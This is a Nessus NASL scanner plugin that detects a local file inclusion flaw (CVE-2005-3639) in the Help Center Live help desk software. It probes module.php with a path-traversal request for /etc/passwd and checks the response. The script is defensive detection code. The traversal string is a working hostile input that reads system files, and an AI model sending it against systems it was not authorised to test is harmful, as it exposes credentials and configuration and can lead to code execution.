#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: HACKERS PAL
#
# This script is released under the GNU GPL v2
#
# updated by Tenable Network Security to support BID 19256 as well.

include("compat.inc");

if(description)
{
  script_id(20223);
  script_cve_id("CVE-2005-3639");
  script_bugtraq_id(15404, 19256);
  script_xref(name:"OSVDB", value:"20861");
  script_xref(name:"OSVDB", value:"28285");
  script_version("$Revision: 1.10 $");
  
  script_name(english:"Help Center Live module.php file Parameter Local File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Help Center Live, a help desk tool written in
PHP. 

The remote version of Help Center Live fails to sanitize input to the
'file' parameter of the 'module.php' script before using it in a PHP
include_once() function.  Regardless of PHP's 'register_globals'
setting, an unauthenticated attacker can exploit this issue to read
files and possibly execute arbitrary PHP code on the affected host
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

  script_summary(english:"Checks HCL local file include flaw");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencie("http_version.nasl");
  exit(0);
}

#the code

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if ( ! can_host_php(port:port) ) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/helpcenterlive", "/hcl", "/helpcenter", "/live", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
 req = http_get(item:string(dir, "/module.php?module=osTicket&file=../../../../../../../../../../../etc/passwd"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(isnull(res)) exit(0);
 if("(Powered By Help Center Live" >< res && egrep(pattern:"root:.*:0:[01]:", string:res)){
       if (report_verbosity > 0) {
         contents = strstr(res, '<div align="center"><h2>');
         if (contents) {
           contents = contents - strstr(contents, "<td>");
           contents = strstr(contents, "</div>");
           contents = contents - "</div>";
         }
         else contents = res;

         security_hole(port:port, extra: contents);
       }
       else
         security_hole(port:port);

       exit(0);
 }
}
